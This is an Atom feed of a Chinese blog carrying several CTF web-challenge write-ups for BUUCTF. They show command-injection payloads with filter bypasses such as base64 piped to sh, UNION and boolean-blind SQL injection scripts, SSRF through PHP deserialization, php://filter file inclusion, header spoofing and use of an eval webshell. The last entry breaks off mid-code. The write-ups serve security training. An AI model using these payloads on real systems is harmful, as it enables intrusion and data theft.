<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>大周&#39;blog</title>
  
  <subtitle>ctf</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lingxin16.github.io/"/>
  <updated>2020-06-22T02:11:50.928Z</updated>
  <id>http://lingxin16.github.io/</id>
  
  <author>
    <name>奝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ACTF2020新生赛-Exec</title>
    <link href="http://lingxin16.github.io/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/"/>
    <id>http://lingxin16.github.io/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/</id>
    <published>2020-06-22T01:57:50.000Z</published>
    <updated>2020-06-22T02:11:50.928Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>题目是长这样子的</p><p><img src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/1.png" alt="1"></p><p>emm..看到ping这个功能就想命令执行和管道符漏洞，就先输入127.0.0.1||ls</p><p><img src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/2.png" alt="2"></p><p>但是只能看到一个index.php</p><p>再看上级目录127.0.0.1||ls /</p><p><img src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/3.png" alt="3"></p><p>然后直接127.0.0.1||cat /flag</p><p><img src="/2020/06/22/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/4.png" alt="4"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址：&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯2018-Fakebook</title>
    <link href="http://lingxin16.github.io/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/"/>
    <id>http://lingxin16.github.io/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/</id>
    <published>2020-06-20T14:27:12.000Z</published>
    <updated>2020-06-20T15:45:12.792Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/1.png" alt="1"></p><p>the Fakebook</p><p>有login和join两个选项，join应该是注册，我们先尝试注册</p><p>注册成功之后直接登录</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/2.png" alt="2"></p><p>username这里可以点进去，进去之后是这样的</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/3.png" alt="3"></p><p>url格式是/view.php?no=1，猜测可以进行注入</p><p>当我们尝试进行注入的时候，发现有waf，当出现有union select的时候就会被拦截</p><p>这里用/**/代替空格进行绕过</p><p>/view.php?no=0 union/**/select 1,2,3,4–+的时候回显</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/4.png" alt="4"></p><p>/view.php?no=0 union/**/select 1,database(),3,4–+得到数据库名fakebook</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/5.png" alt="5"></p><p>/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’fakebook’–+得到表名user</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/6.png" alt="6"></p><p>/view.php?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=’fakebook’ and table_name=’users’–+得到列名</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/7.png" alt="7"></p><p>/view.php?no=0 union/**/select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users –+得到数据</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/8.png" alt="8"></p><p>1d1a05b40f186efa8c4152341eb69a1c8ac32ea0c3d76d6d071427a902ed8ec88c320f54ca1d4e8301a9a43746c74826d2c9113dc30ff93a68e7eda21aa5d94ab4e69O:8:”UserInfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:11:”<a href="http://www.d1a0.cn&quot;;}" target="_blank" rel="noopener">www.d1a0.cn&quot;;}</a> </p><p>这里我们并没有得到flag，而是我们个人资料的反序列化数据，因为在数据中存在我们的博客地址，所以我们尝试使用ssrf读取flag，但是我们并不知道flag所在文件夹，用dirsearch扫描发现flag.php和robots.txt</p><p>robots.txt中存在</p><pre><code>User-agent: *Disallow: /user.php.bak</code></pre><p>下载得到</p><pre><code class="PHP">&lt;?phpclass UserInfo{    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    {        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    }    function get($url)    {        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) {            return 404;        }        curl_close($ch);        return $output;    }    public function getBlogContents ()    {        return $this-&gt;get($this-&gt;blog);    }    public function isValidBlog ()    {        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);    }}</code></pre><p>构造payload</p><pre><code class="PHP">&lt;?phpclass Userinfo{    public $name = &quot;d1a0&quot;;    public $age = 111;    public $blog = &quot;file:///var/www/html/flag.php&quot;;}$data = new Userinfo();echo serialize($data);?&gt;</code></pre><p>/view.php?no=0 union/**/select 1,2,3,’O:8:”Userinfo”:3:{s:4:”name”;s:4:”d1a0”;s:3:”age”;i:111;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p><p><img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/9.png" alt="9"></p><p>看大佬们的博客，还有个非预期解</p><p>使用load_file()函数，直接得到flag，不过前提是知道flag文件位置 </p><p>payload：/view.php?no=0 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4</p><p>太棒了，又学到了许多<img src="/2020/06/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/10.jpg" alt="10"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019华北赛区Day2-HackWorld</title>
    <link href="http://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/"/>
    <id>http://lingxin16.github.io/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/</id>
    <published>2020-06-19T02:23:07.000Z</published>
    <updated>2020-06-19T02:39:19.674Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/19/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay2-HackWorld/1.png" alt="1"></p><p>结合提示，是个sql注入类型的题目，尝试注入测试</p><p>输入单个字母的话提示bool(false)，输入1提示Hello, glzjin wants a girlfriend.  输入2提示Do you want to be my girlfriend?其他数字则是Error Occured When Fetch Result.</p><p>能猜出来是布尔盲注了，而且这里还有过滤，可以用burpsuit来fuzz一下，这里贴出来源代码吧</p><pre><code class="php">&lt;?php$dbuser=&#39;root&#39;;$dbpass=&#39;root&#39;;function safe($sql){    #被过滤的内容 函数基本没过滤    $blackList = array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;`&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;./&#39;);    foreach($blackList as $blackitem){        if(stripos($sql,$blackitem)){            return False;        }    }    return True;}if(isset($_POST[&#39;id&#39;])){    $id = $_POST[&#39;id&#39;];}else{    die();}$db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);if(!$db){    die(mysql_error());}   mysql_select_db(&quot;ctf&quot;,$db);if(safe($id)){    $query = mysql_query(&quot;SELECT content from passage WHERE id = ${id} limit 0,1&quot;);    if($query){        $result = mysql_fetch_array($query);        if($result){            echo $result[&#39;content&#39;];        }else{            echo &quot;Error Occured When Fetch Result.&quot;;        }    }else{        var_dump($query);    }}else{    die(&quot;SQL Injection Checked.&quot;);}</code></pre><p>可以看到过滤了空格等很多东西，但是也有很多东西没过滤</p><p>因为我能力有限，还是研究师傅们的代码吧</p><pre><code class="python">import requestsimport base64import sysimport stringimport hashlibimport ioimport timesys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)        #改变标准输出的默认编码,否则s.text不能输出x = string.printableflag = &quot;&quot;url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;payload={    &quot;id&quot; : &quot;&quot;}for i in range(0,60):    for j in x:        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;%(str(i),ord(j))        s = requests.post(url,data=payload)        #print(s.text)        if &quot;Hello&quot; in s.text:            flag += j            print(flag)            breakprint(flag)</code></pre><p>但是这个代码我运行的时候报错，所以删掉了<code>sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)</code></p><p>能够正常运行，得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2019-高明的黑客</title>
    <link href="http://lingxin16.github.io/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
    <id>http://lingxin16.github.io/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</id>
    <published>2020-06-18T13:54:26.000Z</published>
    <updated>2020-06-18T14:40:13.072Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/1.png" alt="1"></p><p>网站源码到<a href="http://www.tar.gz以供大家观赏，说明网站源码备份" target="_blank" rel="noopener">www.tar.gz以供大家观赏，说明网站源码备份</a></p><p>访问/<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>  得到一个压缩包</p><p>解压缩，得到3002个php文件，3002个……</p><p><img src="/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/2.png" alt="2"></p><p>我这种菜狗，看到这种，头都要没了</p><p>还是看赵师傅的wp吧</p><p><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019%E5%BC%BA%E7%BD%91%E6%9D%AF#toc-heading-6" target="_blank" rel="noopener">https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019%E5%BC%BA%E7%BD%91%E6%9D%AF#toc-heading-6</a></p><p>赵师傅的代码</p><pre><code class="Python">import osimport threadingfrom concurrent.futures.thread import ThreadPoolExecutorimport requestssession = requests.Session()path = &quot;/Users/jinzhao/PhpstormProjects/qwb/web2/&quot;  # 文件夹目录files = os.listdir(path)  # 得到文件夹下的所有文件名称mutex = threading.Lock()pool = ThreadPoolExecutor(max_workers=50)def read_file(file):    f = open(path + &quot;/&quot; + file);  # 打开文件    iter_f = iter(f);  # 创建迭代器    str = &quot;&quot;    for line in iter_f:  # 遍历文件，一行行遍历，读取文本        str = str + line    # 获取一个页面内所有参数    start = 0    params = {}    while str.find(&quot;$_GET[&#39;&quot;, start) != -1:        pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_GET[&#39;&quot;, start) + 1)        var = str[str.find(&quot;$_GET[&#39;&quot;, start) + 7: pos2]        start = pos2 + 1        params[var] = &#39;echo(&quot;glzjin&quot;);&#39;        # print(var)    start = 0    data = {}    while str.find(&quot;$_POST[&#39;&quot;, start) != -1:        pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_POST[&#39;&quot;, start) + 1)        var = str[str.find(&quot;$_POST[&#39;&quot;, start) + 8: pos2]        start = pos2 + 1        data[var] = &#39;echo(&quot;glzjin&quot;);&#39;        # print(var)    # eval test    r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params)    if r.text.find(&#39;glzjin&#39;) != -1:        mutex.acquire()        print(file + &quot; found!&quot;)        mutex.release()    # assert test    for i in params:        params[i] = params[i][:-1]    for i in data:        data[i] = data[i][:-1]    r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params)    if r.text.find(&#39;glzjin&#39;) != -1:        mutex.acquire()        print(file + &quot; found!&quot;)        mutex.release()    # system test    for i in params:        params[i] = &#39;echo glzjin&#39;    for i in data:        data[i] = &#39;echo glzjin&#39;    r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params)    if r.text.find(&#39;glzjin&#39;) != -1:        mutex.acquire()        print(file + &quot; found!&quot;)        mutex.release()    # print(&quot;====================&quot;)for file in files:  # 遍历文件夹    if not os.path.isdir(file):  # 判断是否是文件夹，不是文件夹才打开        # read_file(file)        pool.submit(read_file, file)</code></pre><p>访问 /xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</p><p>得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020新生赛-Include</title>
    <link href="http://lingxin16.github.io/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/"/>
    <id>http://lingxin16.github.io/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/</id>
    <published>2020-06-18T13:42:07.000Z</published>
    <updated>2020-06-18T13:53:11.037Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/1.png" alt="1"></p><p>tips指向?file=flag.php</p><p><img src="/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/2.png" alt="2"></p><p>访问?file=php://filter/read/convert.base64-encode/resource=flag.php</p><p>得到flag.php的base64加密后的内容</p><p><img src="/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/3.png" alt="3"></p><p>然后base64解码得flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>GXYCTF2019-PingPingPing</title>
    <link href="http://lingxin16.github.io/2020/06/17/GXYCTF2019-PingPingPing/"/>
    <id>http://lingxin16.github.io/2020/06/17/GXYCTF2019-PingPingPing/</id>
    <published>2020-06-17T14:02:17.000Z</published>
    <updated>2020-06-17T15:17:32.918Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/1.png" alt="1"></p><p>只有一个/?ip=</p><p>尝试传?ip=127.0.0.1，得到回显</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/2.png" alt="2"></p><p>利用管道符漏洞，传?ip=127.0.0.1||ls</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/3.png" alt="3"></p><p>看到flag.php 传?ip=127.0.0.1||cat%20flag.php</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/4.png" alt="4"></p><p>尝试传一下，得知如果我们传入的字符含有flag空格或者/，那么就会返回错误</p><p>这里用$IFS$1来绕过空格的限制，传?ip=127.0.0.1||cat$IFS$1index.php</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/5.png" alt="5"></p><p>可以看到确实过滤了很多</p><p>这里我用三种办法</p><h4 id="1-变量替换"><a href="#1-变量替换" class="headerlink" title="1.变量替换"></a>1.变量替换</h4><p><code>preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip</code></p><p>因为这个会判断输入语句中是否按顺序出现f l a g，所以我们用</p><p>?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php</p><h4 id="2-内敛执行"><a href="#2-内敛执行" class="headerlink" title="2.内敛执行"></a>2.内敛执行</h4><pre><code>?ip=127.0.0.1||a=g;cat$IFS$1`ls`</code></pre><h4 id="3-sh"><a href="#3-sh" class="headerlink" title="3.sh"></a>3.sh</h4><p>既然过滤了bash，那么可以用sh</p><p>?ip=127.0.0.1||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p><p>其中Y2F0IGZsYWcucGhw是base64加密之后的cat flag.php</p><p>关于命令执行的绕过，可以参考ghtwf01师傅的这篇文章：<a href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">命令执行漏洞利用及绕过方式总结</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-Http</title>
    <link href="http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/"/>
    <id>http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/</id>
    <published>2020-06-13T14:06:42.000Z</published>
    <updated>2020-06-13T14:24:55.053Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/1.png" alt="1"></p><p>主页并没有什么有用的信息，查看源文件，发现Secret.php</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/2.png" alt="2"></p><p>打开</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/3.png" alt="3"></p><p>提示It doesn’t come from ‘<a href="https://www.Sycsecret.com&#39;" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;</a></p><p>那么就是http头伪造 利用burpsuit抓包修改 或者火狐编辑消息头</p><p>这里我用火狐 添加Referer:<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a></p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/4.png" alt="4"></p><p>然后看到Please use “Syclover” browser</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/5.png" alt="5"></p><p>那么再更改User-Agent: “Syclover” browser</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/6.png" alt="6"></p><p>看到No!!! you can only read this locally!!!</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/7.png" alt="7"></p><p>那么再修改X-Forwarded-For: 127.0.0.1</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/8.png" alt="8"></p><p>得到flag</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/9.png" alt="9"></p><p>上边的操作也可以用Python脚本实现</p><pre><code class="Python"># -*- coding: UTF-8 -*-import requestsurl=&quot;http://node3.buuoj.cn:29753/Secret.php&quot;headers={    &quot;Referer&quot;: &quot;https://www.Sycsecret.com&quot;,    &quot;Origin&quot;:&quot;https://www.Sycsecret.com&quot;,    &quot;User-Agent&quot;: &quot;Syclover&quot;,    &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;}r=requests.get(url=url,headers=headers)print(r.text)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-Knife</title>
    <link href="http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/"/>
    <id>http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/</id>
    <published>2020-06-13T13:52:32.000Z</published>
    <updated>2020-06-13T13:58:54.746Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/1.png" alt="1"></p><p>上边有提示我家菜刀丢了，你能帮我找一下么</p><p>并且有<code>eval($_POST[&quot;Syc&quot;]);</code>说明连接密码是Syc</p><p>既然提示菜刀，那么我们用菜刀连接</p><p>这里我用蚁剑，测试连接成功</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/2.png" alt="2"></p><p>在根目录找到flag</p><p><img src="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/3.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-PHP</title>
    <link href="http://lingxin16.github.io/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/"/>
    <id>http://lingxin16.github.io/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/</id>
    <published>2020-06-12T13:58:03.000Z</published>
    <updated>2020-06-12T15:17:09.035Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/1.png" alt="1"></p><p>描述中说有备份网站的习惯，尝试常见的网站备份地址，发现<a href="http://www.zip文件存在" target="_blank" rel="noopener">www.zip文件存在</a></p><p>下载解压，发现存在五个文件</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/2.png" alt="2"></p><p>其中三个PHP文件代码分别为</p><p>index.php</p><pre><code class="php+HTML">&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;I have a cat!&lt;/title&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;&lt;/head&gt;&lt;style&gt;    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }&lt;/style&gt;&lt;body&gt;```index.php&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;I have a cat!&lt;/title&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;&lt;/head&gt;&lt;style&gt;    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }&lt;/style&gt;&lt;body&gt;&lt;div id=&quot;world&quot;&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯    &lt;/div&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！    &lt;/div&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;    &lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;    &lt;/div&gt;    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#39;&gt;&lt;/script&gt;&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>class.php</p><pre><code class="PHP">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: 